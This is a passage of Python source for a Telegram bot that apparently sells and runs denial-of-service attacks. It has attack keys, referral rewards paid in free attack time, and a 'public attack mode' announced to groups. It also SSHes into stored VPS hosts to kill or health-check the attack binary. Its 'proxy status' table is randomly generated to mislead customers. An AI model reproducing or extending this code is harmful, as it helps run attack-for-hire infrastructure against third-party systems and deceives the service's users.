‚î£ ùóßùòÜùóΩùó≤: {'ùóßùóòùó´ùóß' if notice['type'] == 'text' else 'ùó£ùóõùó¢ùóßùó¢' if notice['type'] == 'photo' else 'ùó©ùóúùóóùóòùó¢' if notice['type'] == 'video' else 'ùóôùóúùóüùóò'}
‚îÉ
"""
    
    if notice['content']:
        preview_text += f"‚î£ ùóñùóºùóªùòÅùó≤ùóªùòÅ: {notice['content']}\n"
    
    if notice['type'] == 'document':
        preview_text += f"‚î£ ùóôùó∂ùóπùó≤: {notice['file_name']}\n"

    preview_text += "‚ï∞‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚ïØ\n"
    preview_text += "\n‚ö†Ô∏è ùóñùó¢ùó°ùóôùóúùó•ùó† ùóßùó¢ ùó¶ùóòùó°ùóó ùóßùóõùóúùó¶ ùó°ùó¢ùóßùóúùóñùóò?"

    bot.send_message(
        message.chat.id,
        preview_text,
        reply_markup=markup
    )

@bot.callback_query_handler(func=lambda call: call.data in ['broadcast_now', 'cancel_notice'])
def handle_notice_confirmation(call):
    """Handle broadcast confirmation with premium styling"""
    user_id = str(call.from_user.id)
    notice = instructor_notices.get(user_id)
    
    if not notice:
        bot.edit_message_text("‚ö†Ô∏è ùó°ùó¢ ùó°ùó¢ùóßùóúùóñùóò ùóôùó¢ùó®ùó°ùóó ùóßùó¢ ùóïùó•ùó¢ùóîùóóùóñùóîùó¶ùóß", call.message.chat.id, call.message.message_id)
        return

    results = {'success': 0, 'failed': 0}

    def send_notice(chat_id):
        try:
            caption = f"¬ª¬ª‚Äî‚Äî ùêÄùêãùêéùêçùêÑ ∆Å∆†∆≥ ‚ô• OFFICIAL NOTICE \n\n{notice['content']}" if notice['content'] else "---------------------"
            
            if notice['type'] == 'text':
                bot.send_message(chat_id, caption)
            elif notice['type'] == 'photo':
                bot.send_photo(chat_id, notice['file_id'], caption=caption)
            elif notice['type'] == 'video':
                bot.send_video(chat_id, notice['file_id'], caption=caption)
            elif notice['type'] == 'document':
                bot.send_document(chat_id, notice['file_id'], caption=caption)
            results['success'] += 1
        except Exception as e:
            print(f"Error sending notice to {chat_id}: {e}")
            results['failed'] += 1

    bot.edit_message_text("üì° ùóïùó•ùó¢ùóîùóóùóñùóîùó¶ùóßùóúùó°ùóö ùó°ùó¢ùóßùóúùóñùóò...", call.message.chat.id, call.message.message_id)

    # Send to all users who ever interacted with the bot
    for uid in all_users:
        send_notice(uid)
        time.sleep(0.1)  # Rate limiting

    # Send to all allowed groups
    for gid in ALLOWED_GROUP_IDS:
        send_notice(gid)
        time.sleep(0.2)  # More delay for groups to avoid rate limits

    instructor_notices.pop(user_id, None)

    report = f"""
‚ï≠‚îÅ‚îÅ‚îÅ„Äî üìä ùóïùó•ùó¢ùóîùóóùóñùóîùó¶ùóß ùó•ùóòùó£ùó¢ùó•ùóß „Äï‚îÅ‚îÅ‚îÅ‚ïÆ
‚îÉ
‚î£ ‚úÖ ùó¶ùòÇùó∞ùó∞ùó≤ùòÄùòÄ: {results['success']}
‚î£ ‚ùå ùóôùóÆùó∂ùóπùó≤ùó±: {results['failed']}
‚îÉ
‚î£ ‚è± {datetime.datetime.now().strftime('%d %b %Y %H:%M:%S')}
‚îÉ
‚ï∞‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚ïØ
"""
    bot.send_message(call.message.chat.id, report, reply_markup=create_main_keyboard(call.message))

# ======================
# üë• GROUP MANAGEMENT (STYLISH VERSION)
# ======================
@bot.message_handler(func=lambda msg: msg.text == "üë• ùòºùòøùòø ùôÇùôçùôäùôêùôã")
def add_group_handler(message):
    """Add a new allowed group with premium styling"""
    if not is_owner(message.from_user):
        bot.reply_to(message, "üö´ ùó¢ùóªùóπùòÜ ùóºùòÑùóªùó≤ùóøùòÄ ùó∞ùóÆùóª ùóÆùó±ùó± ùó¥ùóøùóºùòÇùóΩùòÄ!")
        return
    
    bot.reply_to(message, "‚öôÔ∏è ùó¶ùó≤ùóªùó± ùòÅùóµùó≤ ùóöùó•ùó¢ùó®ùó£ ùóúùóó ùòÜùóºùòÇ ùòÑùóÆùóªùòÅ ùòÅùóº ùóÆùó±ùó±.\nExample: `-1001234567890`", parse_mode="Markdown")
    bot.register_next_step_handler(message, process_add_group)

def process_add_group(message):
    """Process group addition with premium styling"""
    try:
        group_id = int(message.text.strip())
        if group_id in ALLOWED_GROUP_IDS:
            bot.reply_to(message, "‚ö†Ô∏è ùóßùóµùó∂ùòÄ ùó¥ùóøùóºùòÇùóΩ ùó∂ùòÄ ùóÆùóπùóøùó≤ùóÆùó±ùòÜ ùó∂ùóª ùòÅùóµùó≤ ùóÆùóπùóπùóºùòÑùó≤ùó± ùóπùó∂ùòÄùòÅ.")
            return
        ALLOWED_GROUP_IDS.append(group_id)
        bot.reply_to(message, f"‚úÖ ùóöùóøùóºùòÇùóΩ ùóúùóó `{group_id}` ùóÆùó±ùó±ùó≤ùó± ùòÄùòÇùó∞ùó∞ùó≤ùòÄùòÄùó≥ùòÇùóπùóπùòÜ!", parse_mode="Markdown")
    except Exception as e:
        bot.reply_to(message, f"‚ùå ùóòùóøùóøùóºùóø: {str(e)}")    

@bot.message_handler(func=lambda msg: msg.text == "üë• ùôçùôÄùôàùôäùôëùôÄ ùôÇùôçùôäùôêùôã")
def remove_group_handler(message):
    """Remove an allowed group with premium styling"""
    if not is_owner(message.from_user):
        bot.reply_to(message, "üö´ ùó¢ùóªùóπùòÜ ùóºùòÑùóªùó≤ùóøùòÄ ùó∞ùóÆùóª ùóøùó≤ùó∫ùóºùòÉùó≤ ùó¥ùóøùóºùòÇùóΩùòÄ!")
        return
    
    if not ALLOWED_GROUP_IDS:
        bot.reply_to(message, "‚ö†Ô∏è ùó°ùóº ùó¥ùóøùóºùòÇùóΩùòÄ ùó∂ùóª ùòÅùóµùó≤ ùóÆùóπùóπùóºùòÑùó≤ùó± ùóπùó∂ùòÄùòÅ!")
        return
    
    groups_list = "\n".join(f"{i+1}. `{gid}`" for i, gid in enumerate(ALLOWED_GROUP_IDS))
    bot.reply_to(message, f"‚öôÔ∏è ùóñùóµùóºùóºùòÄùó≤ ùó¥ùóøùóºùòÇùóΩ ùóªùòÇùó∫ùóØùó≤ùóø ùòÅùóº ùóøùó≤ùó∫ùóºùòÉùó≤:\n\n{groups_list}", parse_mode="Markdown")
    bot.register_next_step_handler(message, process_remove_group)

def process_remove_group(message):
    """Process group removal with premium styling"""
    try:
        idx = int(message.text.strip()) - 1
        if 0 <= idx < len(ALLOWED_GROUP_IDS):
            removed_group = ALLOWED_GROUP_IDS.pop(idx)
            bot.reply_to(message, f"‚úÖ ùó•ùó≤ùó∫ùóºùòÉùó≤ùó± ùóöùóøùóºùòÇùóΩ ùóúùóó `{removed_group}`", parse_mode="Markdown")
        else:
            bot.reply_to(message, "‚ùå ùóúùóªùòÉùóÆùóπùó∂ùó± ùó∞ùóµùóºùó∂ùó∞ùó≤!")
    except Exception as e:
        bot.reply_to(message, f"‚ùå ùóòùóøùóøùóºùóø: {str(e)}")

@bot.message_handler(func=lambda msg: msg.text == "üåê ùòºùòæùôèùôÑùôëùòºùôèùôÄ ùôãùôêùòΩùôáùôÑùòæ")
def activate_public(message):
    """Activate public attack mode for a group with premium styling"""
    if not is_owner(message.from_user):
        bot.reply_to(message, "‚õî ùó¢ùóªùóπùòÜ ùóºùòÑùóªùó≤ùóø ùó∞ùóÆùóª ùóÆùó∞ùòÅùó∂ùòÉùóÆùòÅùó≤ ùóΩùòÇùóØùóπùó∂ùó∞ ùó∫ùóºùó±ùó≤!")
        return
    
    markup = telebot.types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)
    for group_id in ALLOWED_GROUP_IDS:
        if group_id in PUBLIC_GROUPS:  # Skip already public groups
            continue
        try:
            chat = bot.get_chat(group_id)
            markup.add(telebot.types.KeyboardButton(f"üåê {chat.title}"))
        except:
            continue
    
    if len(markup.keyboard) == 0:  # No groups available
        bot.reply_to(message, "‚ö†Ô∏è ùóîùóπùóπ ùóÆùóπùóπùóºùòÑùó≤ùó± ùó¥ùóøùóºùòÇùóΩùòÄ ùóÆùóπùóøùó≤ùóÆùó±ùòÜ ùóµùóÆùòÉùó≤ ùóΩùòÇùóØùóπùó∂ùó∞ ùó∫ùóºùó±ùó≤ ùóÆùó∞ùòÅùó∂ùòÉùó≤!", reply_markup=create_main_keyboard(message))
        return
    
    markup.add(telebot.types.KeyboardButton("‚ùå ùóñùóÆùóªùó∞ùó≤ùóπ"))
    
    bot.reply_to(message, "üõ†Ô∏è ùó¶ùó≤ùóπùó≤ùó∞ùòÅ ùóÆ ùó¥ùóøùóºùòÇùóΩ ùó≥ùóºùóø ùóΩùòÇùóØùóπùó∂ùó∞ ùóÆùòÅùòÅùóÆùó∞ùó∏ùòÄ (ùü≠ùüÆùü¨ùòÄ ùóπùó∂ùó∫ùó∂ùòÅ, ùü≠ ùó©ùó£ùó¶):", reply_markup=markup)
    bot.register_next_step_handler(message, process_public_group_selection)

def process_public_group_selection(message):
    """Process group selection for public mode with premium styling"""
    if message.text == "‚ùå ùóñùóÆùóªùó∞ùó≤ùóπ":
        bot.reply_to(message, "üö´ ùó£ùòÇùóØùóπùó∂ùó∞ ùó∫ùóºùó±ùó≤ ùóÆùó∞ùòÅùó∂ùòÉùóÆùòÅùó∂ùóºùóª ùó∞ùóÆùóªùó∞ùó≤ùóπùóπùó≤ùó±.", reply_markup=create_main_keyboard(message))
        return
    
    selected_title = message.text[2:]  # Remove the üåê prefix
    selected_group = None
    
    for group_id in ALLOWED_GROUP_IDS:
        try:
            chat = bot.get_chat(group_id)
            if chat.title == selected_title:
                selected_group = group_id
                break
        except:
            continue
    
    if not selected_group:
        bot.reply_to(message, "‚ùå ùóöùóøùóºùòÇùóΩ ùóªùóºùòÅ ùó≥ùóºùòÇùóªùó±!", reply_markup=create_main_keyboard(message))
        return
    
    # Add the selected group to public groups list
    if selected_group not in PUBLIC_GROUPS:
        PUBLIC_GROUPS.append(selected_group)
    
    bot.reply_to(message, 
        f"""
‚ï≠‚îÅ‚îÅ‚îÅ„Äî üåê ùó£ùó®ùóïùóüùóúùóñ ùó†ùó¢ùóóùóò ùóîùóñùóßùóúùó©ùóîùóßùóòùóó „Äï‚îÅ‚îÅ‚îÅ‚ïÆ
‚îÉ
‚î£ üîπ ùóöùóøùóºùòÇùóΩ: {selected_title}
‚î£ ‚è± ùó†ùóÆùòÖ ùó±ùòÇùóøùóÆùòÅùó∂ùóºùóª: ùü≠ùüÆùü¨ùòÄ
‚î£ üßµ ùó†ùóÆùòÅùòÅùóÆùó∞ùó∏ùòÄ: ùü≠ùü¨ùü¨
‚î£ üîì ùó°ùóº ùó∏ùó≤ùòÜ ùóøùó≤ùóæùòÇùó∂ùóøùó≤ùó±
‚îÉ
‚ï∞‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚ïØ
""", 
        reply_markup=create_main_keyboard(message))
    
    # Send announcement to the selected group
    try:
        bot.send_message(
            selected_group,
            """
‚ï≠‚îÅ‚îÅ‚îÅ„Äî üåê ùó£ùó®ùóïùóüùóúùóñ ùóîùóßùóßùóîùóñùóû ùó†ùó¢ùóóùóò ùóîùóñùóßùóúùó©ùóîùóßùóòùóó „Äï‚îÅ‚îÅ‚îÅ‚ïÆ
‚îÉ
‚î£ üî• ùóîùóªùòÜùóºùóªùó≤ ùó∞ùóÆùóª ùóªùóºùòÑ ùóπùóÆùòÇùóªùó∞ùóµ ùóÆùòÅùòÅùóÆùó∞ùó∏ùòÄ!
‚îÉ
‚î£ ‚ö†Ô∏è ùóüùó∂ùó∫ùó∂ùòÅùóÆùòÅùó∂ùóºùóªùòÄ:
‚î£ ‚è± ùó†ùóÆùòÖ ùó±ùòÇùóøùóÆùòÅùó∂ùóºùóª: ùü≠ùüÆùü¨ùòÄ
‚î£ üßµ ùó†ùóÆùòÖ ùóßùóµùóøùó≤ùóÆùó±ùòÄ: ùü≠8ùü¨ùü¨
‚î£ üîì ùó°ùóº ùó∏ùó≤ùòÜ ùóøùó≤ùóæùòÇùó∂ùóøùó≤ùó±
‚îÉ
‚î£ üí° ùó®ùòÄùó≤ ùòÅùóµùó≤ ùóÆùòÅùòÅùóÆùó∞ùó∏ ùó∞ùóºùó∫ùó∫ùóÆùóªùó± ùóÆùòÄ ùòÇùòÄùòÇùóÆùóπ!
‚îÉ
‚ï∞‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚ïØ
"""
        )
    except Exception as e:
        print(f"[ERROR] Could not send public mode announcement: {e}")

@bot.message_handler(func=lambda msg: msg.text == "‚ùå ùòøùôÄùòºùòæùôèùôÑùôëùòºùôèùôÄ ùôãùôêùòΩùôáùôÑùòæ")
def deactivate_public_start(message):
    """Start deactivation of public attack mode with premium styling"""
    if not is_owner(message.from_user):
        bot.reply_to(message, "‚ùå Only owner can deactivate public mode!")
        return

    if not PUBLIC_GROUPS:
        bot.reply_to(message, "‚ÑπÔ∏è Public mode is not active on any group.")
        return

    markup = telebot.types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)

    for group_id in PUBLIC_GROUPS:
        try:
            chat = bot.get_chat(group_id)
            markup.add(telebot.types.KeyboardButton(f"‚ùå {chat.title}"))
        except:
            markup.add(telebot.types.KeyboardButton(f"‚ùå Unknown Group ({group_id})"))

    markup.add(telebot.types.KeyboardButton("‚ùå Cancel"))

    bot.reply_to(message, "Select group(s) to deactivate public mode:", reply_markup=markup)
    bot.register_next_step_handler(message, process_deactivate_public_selection)

def process_deactivate_public_selection(message):
    """Process deactivation of public mode with premium styling"""
    if message.text == "‚ùå Cancel":
        bot.reply_to(message, "‚ùå Deactivation cancelled.", reply_markup=create_main_keyboard(message))
        return

    selected_title = message.text[2:]  # remove ‚ùå emoji

    # Find which group was selected
    selected_group = None
    for group_id in PUBLIC_GROUPS:
        try:
            chat = bot.get_chat(group_id)
            if chat.title == selected_title:
                selected_group = group_id
                break
        except:
            if f"Unknown Group ({group_id})" == selected_title:
                selected_group = group_id
                break

    if selected_group:
        PUBLIC_GROUPS.remove(selected_group)
        try:
            bot.send_message(selected_group, "‚ùå PUBLIC ATTACK MODE HAS BEEN DEACTIVATED.")
        except:
            pass
        bot.reply_to(message, f"‚úÖ Public mode deactivated for {selected_title}.", reply_markup=create_main_keyboard(message))
    else:
        bot.reply_to(message, "‚ùå Selected group not found in public groups list.", reply_markup=create_main_keyboard(message))
        
# ======================
# üë• ADMIN MANAGEMENT (STYLISH VERSION)
# ======================
@bot.message_handler(func=lambda msg: msg.text == "‚ûï ùòºùòøùòø ùòºùòøùôàùôÑùôâ")
def start_add_admin(message):
    """Start admin addition process with premium styling"""
    if not is_owner(message.from_user):
        bot.reply_to(message, "‚ùå ùó¢ùó°ùóüùó¨ ùó¢ùó™ùó°ùóòùó•ùó¶ ùóñùóîùó° ùóîùóóùóó ùóîùóóùó†ùóúùó°ùó¶!")
        return
    bot.reply_to(message, "üìù ùóòùóªùòÅùó≤ùóø ùòÅùóµùó∏ ùó®ùó¶ùóòùó•ùó°ùóîùó†ùóò (without @) ùóºùó≥ ùòÅùóµùó≤ ùóÆùó±ùó∫ùó∂ùóª ùòÅùóº ùóÆùó±ùó±:")
    bot.register_next_step_handler(message, process_add_admin)

def process_add_admin(message):
    """Process admin addition with premium styling"""
    username = message.text.strip().lstrip("@")
    if username in ADMIN_IDS:
        bot.reply_to(message, f"‚ö†Ô∏è @{username} ùó∂ùòÄ ùóÆùóπùóøùó≤ùóÆùó±ùòÜ ùóÆùóª ùóÆùó±ùó∫ùó∂ùóª.")
        return
    ADMIN_IDS.append(username)
    save_admins()
    bot.reply_to(message, f"‚úÖ ùóîùóóùóóùóòùóó: @{username} ùó∂ùòÄ ùóªùóºùòÑ ùóÆùóª ùóîùóóùó†ùóúùó°.")

@bot.message_handler(func=lambda msg: msg.text == "‚ûñ ùôçùôÄùôàùôäùôëùôÄ ùòºùòøùôàùôÑùôâ")
def start_remove_admin(message):
    """Start admin removal process with premium styling"""
    if not is_owner(message.from_user):
        bot.reply_to(message, "‚ùå ùó¢ùó°ùóüùó¨ ùó¢ùó™ùó°ùóòùó•ùó¶ ùóñùóîùó° ùó•ùóòùó†ùó¢ùó©ùóò ùóîùóóùó†ùóúùó°ùó¶!")
        return
    bot.reply_to(message, "üìù ùóòùóªùòÅùó≤ùóø ùòÅùóµùó≤ ùó®ùó¶ùóòùó•ùó°ùóîùó†ùóò (without @) ùòÅùóº ùóøùó≤ùó∫ùóºùòÉùó≤:")
    bot.register_next_step_handler(message, process_remove_admin)

def process_remove_admin(message):
    """Process admin removal with premium styling"""
    username = message.text.strip().lstrip("@")
    if username not in ADMIN_IDS:
        bot.reply_to(message, f"‚ùå @{username} ùó∂ùòÄ ùóªùóºùòÅ ùó∂ùóª ùòÅùóµùó≤ ùóÆùó±ùó∫ùó∂ùóª ùóπùó∂ùòÄùòÅ.")
        return
    ADMIN_IDS.remove(username)
    save_admins()
    bot.reply_to(message, f"üóëÔ∏è ùó•ùóòùó†ùó¢ùó©ùóòùóó: @{username} ùóµùóÆùòÄ ùóØùó≤ùó≤ùóª ùóøùó≤ùó∫ùóºùòÉùó≤ùó± ùó≥ùóøùóºùó∫ ùóîùóóùó†ùóúùó°ùó¶.")    
    
@bot.message_handler(func=lambda msg: msg.text == "üìã ùóîùóóùó†ùóúùó° ùóüùóúùó¶ùóß")
def show_admin_list(message):
    """Show list of all admins with premium styling"""
    if not is_owner(message.from_user):
        bot.reply_to(message, "‚ùå ùó¢ùóªùóπùòÜ ùòÅùóµùó≤ ùóºùòÑùóªùó≤ùóø ùó∞ùóÆùóª ùòÉùó∂ùó≤ùòÑ ùòÅùóµùó≤ ùóÆùó±ùó∫ùó∂ùóª ùóπùó∂ùòÄùòÅ!")
        return

    if not ADMIN_IDS:
        bot.reply_to(message, "‚ö†Ô∏è ùó°ùóº ùóÆùó±ùó∫ùó∂ùóªùòÄ ùó≥ùóºùòÇùóªùó±.")
        return

    admin_list = "\n".join([f"‚Ä¢ @{username}" for username in ADMIN_IDS])
    bot.reply_to(message, f"üìã *ùóîùóóùó†ùóúùó°ùó¶ ùóüùóúùó¶ùóß:*\n\n{admin_list}", parse_mode="Markdown")

# ======================
# üéÅ REFERRAL SYSTEM (STYLISH VERSION)
# ======================
@bot.message_handler(func=lambda msg: msg.text == "üéÅ ùó•ùóòùóôùóôùóòùó•ùóîùóü")
def generate_referral(message):
    """Generate referral link for user with premium styling"""
    user_id = str(message.from_user.id)
    
    # Check if user already has a referral code
    if user_id in REFERRAL_CODES:
        code = REFERRAL_CODES[user_id]
    else:
        # Generate new referral code
        code = f"Alonepapa-{user_id[:4]}-{os.urandom(2).hex().upper()}"
        REFERRAL_CODES[user_id] = code
        save_data()
    
    # Create referral link
    referral_link = f"https://t.me/{bot.get_me().username}?start={code}"
    
    response = f"""
üåü ùó•ùóòùóôùóòùó•ùó•ùóîùóü ùó£ùó•ùó¢ùóöùó•ùóîùó† üåü

üîó ùó¨ùóºùòÇùóø ùóøùó≤ùó≥ùó≤ùóøùóøùóÆùóπ ùóπùó∂ùóªùó∏:
{referral_link}

ùóõùóºùòÑ ùó∂ùòÅ ùòÑùóºùóøùó∏ùòÄ:
1. Share this link with friends
2. When they join using your link
3. ùóïùó¢ùóßùóõ ùóºùó≥ ùòÜùóºùòÇ ùó¥ùó≤ùòÅ ùóÆ ùó≥ùóøùó≤ùó≤ {REFERRAL_REWARD_DURATION}ùòÄ ùóÆùòÅùòÅùóÆùó∞ùó∏!
   (Valid for 10 minutes only)

üíé ùóßùóµùó≤ ùó∫ùóºùóøùó≤ ùòÜùóºùòÇ ùòÄùóµùóÆùóøùó≤, ùòÅùóµùó≤ ùó∫ùóºùóøùó≤ ùòÜùóºùòÇ ùó≤ùóÆùóøùóª!
"""
    bot.reply_to(message, response)

def handle_referral(message, referral_code):
    """Process referral code usage with premium styling"""
    new_user_id = str(message.from_user.id)
    
    # Check if this user already exists in the system
    if new_user_id in redeemed_users or new_user_id in REFERRAL_LINKS:
        return  # Existing user, don't generate new keys
    
    # Check if this is a valid referral code
    referrer_id = None
    for uid, code in REFERRAL_CODES.items():
        if code == referral_code:
            referrer_id = uid
            break
    
    if referrer_id:
        # Store that this new user came from this referrer
        REFERRAL_LINKS[new_user_id] = referrer_id
        
        # Generate free attack keys for both users (valid for 10 minutes)
        expiry_time = time.time() + 600  # 10 minutes in seconds
        
        # For referrer
        referrer_key = f"REF-{referrer_id[:4]}-{os.urandom(2).hex().upper()}"
        keys[referrer_key] = {
            'expiration_time': expiry_time,
            'generated_by': "SYSTEM",
            'duration': REFERRAL_REWARD_DURATION
        }
        
        # For new user
        new_user_key = f"REF-{new_user_id[:4]}-{os.urandom(2).hex().upper()}"
        keys[new_user_key] = {
            'expiration_time': expiry_time,
            'generated_by': "SYSTEM",
            'duration': REFERRAL_REWARD_DURATION
        }
        
        save_data()
        
        # Notify both users
        try:
            # Message to referrer
            bot.send_message(
                referrer_id,
                f"üéâ ùó°ùóòùó™ ùó•ùóòùóôùóòùó•ùó•ùóîùóü!\n"
                f"üë§ {get_display_name(message.from_user)} used your referral link\n"
                f"üîë ùó¨ùóºùòÇùóø ùóøùó≤ùòÑùóÆùóøùó± ùó∏ùó≤ùòÜ: {referrer_key}\n"
                f"‚è± {REFERRAL_REWARD_DURATION}ùòÄ ùó≥ùóøùó≤ùó≤ ùóÆùòÅùòÅùóÆùó∞ùó∏ (Valid for 10 minutes)"
            )
            
            # Message to new user
            bot.send_message(
                message.chat.id,
                f"üéÅ ùó™ùóòùóüùóñùó¢ùó†ùóò ùóïùó¢ùó°ùó®ùó¶!\n"
                f"üîë ùó¨ùóºùòÇùóø ùóøùó≤ùòÑùóÆùóøùó± ùó∏ùó≤ùòÜ: {new_user_key}\n"
                f"‚è± {REFERRAL_REWARD_DURATION}ùòÄ ùó≥ùóøùó≤ùó≤ ùóÆùòÅùòÅùóÆùó∞ùó∏ (Valid for 10 minutes)\n\n"
                f"ùó®ùòÄùó≤ redeem key button to redeem your key!"
            )
        except Exception as e:
            print(f"Error sending referral notifications: {e}")

# ======================
# üçÖ PROXY STATUS (STYLISH VERSION)
# ======================
def get_proxy_status():
    """Generate proxy status report in a formatted box with premium styling"""

    countries = [
        ("United States", "üá∫üá∏"), ("Germany", "üá©üá™"), ("Japan", "üáØüáµ"),
        ("Singapore", "üá∏üá¨"), ("Netherlands", "üá≥üá±"), ("France", "üá´üá∑"),
        ("United Kingdom", "üá¨üáß"), ("Canada", "üá®üá¶"), ("Russia", "üá∑üá∫"),
        ("Brazil", "üáßüá∑"), ("India", "üáÆüá≥"), ("Australia", "üá¶üá∫"),
        ("South Korea", "üá∞üá∑"), ("Sweden", "üá∏üá™"), ("Switzerland", "üá®üá≠"),
        ("Italy", "üáÆüáπ"), ("Spain", "üá™üá∏"), ("Norway", "üá≥üá¥"),
        ("Mexico", "üá≤üáΩ"), ("South Africa", "üáøüá¶"), ("Poland", "üáµüá±"),
        ("Turkey", "üáπüá∑"), ("Argentina", "üá¶üá∑"), ("Thailand", "üáπüá≠"),
        ("Ukraine", "üá∫üá¶"), ("Malaysia", "üá≤üáæ"), ("Indonesia", "üáÆüá©"),
        ("Philippines", "üáµüá≠"), ("Vietnam", "üáªüá≥"), ("Saudi Arabia", "üá∏üá¶")
    ]
    
    # Randomly select 6 to 8 countries
    selected_countries = random.sample(countries, random.randint(6, 8))
    
    rows = []
    for country, flag in selected_countries:
        if random.random() < 0.6:
            ping = random.randint(5, 50)
            status = "‚úÖ ACTIVE"
            ping_display = f"{ping} ms"
        else:
            status = "‚ùå BUSY"
            ping_display = "--"
        rows.append((f"{flag} {country}", status, ping_display))

    # Column widths
    col1_width = 19
    col2_width = 11
    col3_width = 8

    def format_row(row):
        return f"| {row[0]:<{col1_width}}| {row[1]:<{col2_width}}| {row[2]:<{col3_width}}|"

    border = f"+{'-' * (col1_width + 1)}+{'-' * (col2_width + 1)}+{'-' * (col3_width + 1)}+"

    # Build the table
    table = [border]
    table.append(format_row(["Country", "Status", "Ping"]))
    table.append(border)

    for row in rows:
        table.append(format_row(row))
        table.append("")  # Empty line between rows

    table.append(border)
    table.append("")
    table.append("‚úÖ ACTIVE - Available")
    table.append("‚ùå BUSY  - Proxy overloaded")
    table.append(f"\n üöÄ Total: {len(rows)} proxies, {sum(1 for row in rows if 'ACTIVE' in row[1])} available")

    return "\n".join(table)

@bot.message_handler(func=lambda msg: msg.text == "üçÖ ùôãùôçùôäùôìùôî ùôéùôèùòºùôèùôêùôé")
def show_proxy_status(message):
    """Show proxy status with loading animation and premium styling"""
    # Send processing message
    processing_msg = bot.send_message(message.chat.id, "üîç Scanning global proxy network...")
    
    # Create loading animation
    dots = ["", ".", "..", "..."]
    for i in range(4):
        try:
            bot.edit_message_text(
                f"üîç Scanning global proxy network{dots[i]}",
                message.chat.id,
                processing_msg.message_id
            )
            time.sleep(0.5)
        except:
            pass
    
    # Wait total 2 seconds
    time.sleep(0.5)  # Additional delay after animation
    
    # Get and send the status report
    status_report = get_proxy_status()
    
    try:
        bot.edit_message_text(
            status_report,
            message.chat.id,
            processing_msg.message_id
        )
    except:
        bot.send_message(message.chat.id, status_report)
        
# Add this handler to your bot (place it with other message handlers)
@bot.message_handler(func=lambda msg: msg.text == "üõë ùôéùôèùôäùôã ùòºùôèùôèùòºùòæùôÜ")
def stop_user_attack(message):
    """Stop all running attacks for the current user with premium styling"""
    user_id = str(message.from_user.id)
    
    # Find all running attacks by this user
    user_attacks = [aid for aid, details in running_attacks.items() if details['user_id'] == user_id]
    
    if not user_attacks:
        bot.reply_to(message, "‚ö†Ô∏è ùó°ùóº ùóøùòÇùóªùóªùó∂ùóªùó¥ ùóÆùòÅùòÅùóÆùó∞ùó∏ùòÄ ùó≥ùóºùòÇùóªùó± ùòÅùóº ùòÄùòÅùóºùóΩ.")
        return
    
    # Try to stop each attack
    stopped_count = 0
    for attack_id in user_attacks:
        attack_details = running_attacks.get(attack_id)
        if attack_details:
            try:
                # Get VPS details
                vps_ip = attack_details['vps_ip']
                vps = next((v for v in VPS_LIST if v[0] == vps_ip), None)
                
                if vps:
                    ip, username, password = vps
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(ip, username=username, password=password, timeout=10)
                    
                    # Kill the attack process
                    ssh.exec_command(f"pkill -f {BINARY_NAME}")
                    ssh.close()
                    stopped_count += 1
            except Exception as e:
                print(f"Error stopping attack: {e}")
            finally:
                # Remove from running attacks
                running_attacks.pop(attack_id, None)
    
    if stopped_count > 0:
        bot.reply_to(message, f"‚úÖ ùó¶ùòÅùóºùóΩùóΩùó≤ùó± {stopped_count} ùóÆùòÅùòÅùóÆùó∞ùó∏{'ùòÄ' if stopped_count > 1 else ''}!")
    else:
        bot.reply_to(message, "‚ö†Ô∏è ùóñùóºùòÇùóπùó± ùóªùóºùòÅ ùòÄùòÅùóºùóΩ ùóÆùóªùòÜ ùóÆùòÅùòÅùóÆùó∞ùó∏ùòÄ.")

# Add this function in the HELPER FUNCTIONS section
def get_vps_health(ip, username, password):
    """Get VPS health with raw metrics and percentage"""
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip, username=username, password=password, timeout=10)
        
        health_data = {
            'cpu': None,
            'memory': None,
            'disk': None,
            'binary_exists': False,
            'binary_executable': False,
            'network': False,
            'health_percent': 0
        }
        
        # 1. Check CPU usage
        stdin, stdout, stderr = ssh.exec_command("top -bn1 | grep 'Cpu(s)' | awk '{print $2 + $4}'")
        cpu_usage = float(stdout.read().decode().strip())
        health_data['cpu'] = f"{cpu_usage:.1f}%"
        
        # 2. Check memory usage
        stdin, stdout, stderr = ssh.exec_command("free -m | awk 'NR==2{printf \"%.2f\", $3*100/$2 }'")
        mem_usage = float(stdout.read().decode().strip())
        health_data['memory'] = f"{mem_usage:.1f}%"
        
        # 3. Check disk usage
        stdin, stdout, stderr = ssh.exec_command("df -h | awk '$NF==\"/\"{printf \"%s\", $5}'")
        disk_usage = stdout.read().decode().strip()
        health_data['disk'] = disk_usage
        
        # 4. Check binary exists
        stdin, stdout, stderr = ssh.exec_command(f"ls -la /home/master/freeroot/root/{BINARY_NAME} 2>/dev/null || echo 'Not found'")
        binary_exists = "Not found" not in stdout.read().decode()
        health_data['binary_exists'] = binary_exists
        
        # 5. Check binary executable
        stdin, stdout, stderr = ssh.exec_command(f"test -x /home/master/freeroot/root/{BINARY_NAME} && echo 'Executable' || echo 'Not executable'")
